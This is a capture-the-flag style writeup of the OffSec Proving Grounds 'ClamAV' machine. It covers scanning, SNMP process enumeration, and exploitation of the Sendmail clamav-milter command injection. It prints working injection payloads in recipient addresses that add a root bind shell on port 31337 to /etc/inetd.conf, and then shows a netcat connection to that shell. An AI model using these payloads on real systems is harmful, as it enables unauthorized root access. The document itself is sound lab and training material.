---
title: OffSec - Proving Grounds - ClamAV
date: 2025-12-22 19:30:00 +0530
categories: [OffSec, Proving Grounds Practice]
tags: [Linux, ClamAV Milter, Sendmail]
math: true
mermaid: true
---

![ClamAV Banner](/assets/images/writeups/ClamAV-OffSec/banner.png)

## TL;DR

This writeup is based on the **[ClamAV](https://portal.offsec.com/machine/clamav-179/overview/details)** machine, involving a legacy Linux box. I began by performing an Nmap scan, which revealed multiple open ports including 22 (SSH), 25 (SMTP), 80 (HTTP), 139 (SMB), 199 (SNMP), 199 (SNMP), 445 and  60000 (SSH). While enumerating the SNMP service, we discovered the full process list which revealed a **ClamAV Milter** instance running on the target. We identified a critical Remote Command Execution vulnerability in this service. By exploiting an address extension bypass in Sendmail, we injected a command to modify the system's `inetd` configuration, opening a backdoor root shell on port 31337.

## Scanning Network

I began with an Nmap scan and identified several open ports running outdated services. Let's review the Nmap results.

```bash
sudo nmap -sS -sV -sC -p- -v 192.168.209.42 -oN scans/fullport.scan

Nmap scan report for 192.168.209.42
Host is up (0.064s latency).
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.156], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: Ph33r
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
445/tcp   open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-12-23T04:48:04-05:00
|_clock-skew: mean: 7h29m59s, deviation: 3h32m08s, median: 4h59m58s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   0XBABE<00>             Flags: <unique><active>
|   0XBABE<03>             Flags: <unique><active>
|   0XBABE<20>             Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>         Flags: <group><active>
|   WORKGROUP<1d>         Flags: <unique><active>
|_  WORKGROUP<1e>         Flags: <group><active>
```

I proceeded to enumerate the discovered services.

## Enumeration

### HTTP Enumeration 

Let's see the IP on the browser.

![Web Page](/assets/images/writeups/ClamAV-OffSec/1.png)

I observed a simple page displaying a long binary string. Decoding this string revealed a simple taunt:

`ifyoudontpwnmeuran00b`

I performed directory brute-forcing using dirsearch to find hidden paths.

```bash

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                             
 (_||| _) (/_(_|| (_| )                                                                                                                                                                      
                                                                                                                                                                                             
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220544

Output File: /home/kali/Documents/offsec/ClamAV/reports/http_192.168.209.42/__25-12-27_20-48-02.txt

Target: http://192.168.209.42/

[20:48:02] Starting:                                                                                                                                                                         
[20:48:06] 403 -  272B  - /doc    

Task Completed#!/usr/bin/env   
```

The scan identified a `/doc` directory returning a 403 Forbidden status. This means we cannot move further.

### SNMP Enumeration

Given the open SNMP port, I utilized `snmp-check` to enumerate running processes.

```bash
snmp-check 192.169.209.42

snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.209.42:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 192.168.209.42
  Hostname                      : 0xbabe.local
  Description                   : Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
  Contact                       : Root <root@localhost> (configure /etc/snmp/snmpd.local.conf)
  Location                      : Unknown (configure /etc/snmp/snmpd.local.conf)
  Uptime snmp                   : 00:02:38.36
  Uptime system                 : 00:01:59.72
  System date                   : 2025-12-22 14:04:20.0

...

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     runnable              init                  init [2]                                  
  2                     runnable              ksoftirqd/0           ksoftirqd/0                               
  3                     runnable              events/0              events/0                                                          
  3780                  runnable              clamd                 /usr/local/sbin/clamd                     
  3782                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
  3791                  runnable              inetd                 /usr/sbin/inetd                           
  3795                  runnable              nmbd                  /usr/sbin/nmbd        -D                  
  3797                  runnable              smbd                  /usr/sbin/smbd        -D                  
  3801                  running               snmpd                 /usr/sbin/snmpd       -Lsd -Lf /dev/null -p /var/run/snmpd.pid
  3807                  runnable              smbd                  /usr/sbin/smbd        -D                  
  3808                  runnable              sshd                  /usr/sbin/sshd                                     
  3941                  runnable              getty                 /sbin/getty           38400 tty6
```

The process list from the SNMP scan revealed that <b>`clamav-milter`</b> is running on the system.

## Exploitation

I researched this service and found that clamav-milter (specifically when integrated with Sendmail) is vulnerable to [Sendmail with clamav-milter < 0.91.2 - Remote Command Execution](https://www.exploit-db.com/exploits/4761){:target="_blank"}.

The exploit leverages a command injection flaw where unsanitized recipient addresses are passed to `popen` for notification. Attackers can bypass Sendmail's strict input filters by appending the payload to a valid username using the `+` character (address extension). This forces the milter to process the full string, executing the injected shell command with the elevated privileges of the milter service. We utilized a Perl exploit which modifies the `/etc/inetd.conf` file to bind a root shell to port <b>31337</b>.

```bash
perl 4761.pl 192.168.209.42

Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.209.42...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Sat, 22 Dec 2025 14:29:31 -0500; (No UCE/UBE) logging access from: [192.168.45.180](FAIL)-[192.168.45.180]
250-localhost.localdomain Hello [192.168.45.180], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 5BRJTVUJ004163 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection
```

Before attempting to connect, I verified that the port was successfully opened using Nmap.

```bash
sudo nmap -p31337 192.168.209.42                  
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-22 16:00 IST
Nmap scan report for 192.168.209.42
Host is up (0.063s latency).

PORT      STATE SERVICE
31337/tcp open  Elite

Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
```

With the port confirmed open, I connected to the target using Netcat.

```bash
nc -nv 192.168.209.42 31337

(UNKNOWN) [192.168.209.42] 31337 (?) open
id
uid=0(root) gid=0(root) groups=0(root)
bash -i
bash: no job control in this shell
root@0xbabe:/# cat /root/proof.txt
```

This dropped me directly into a root shell, granting full control over the machine.

Thanks for reading this far. If you enjoyed the writeup, do support me [here](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.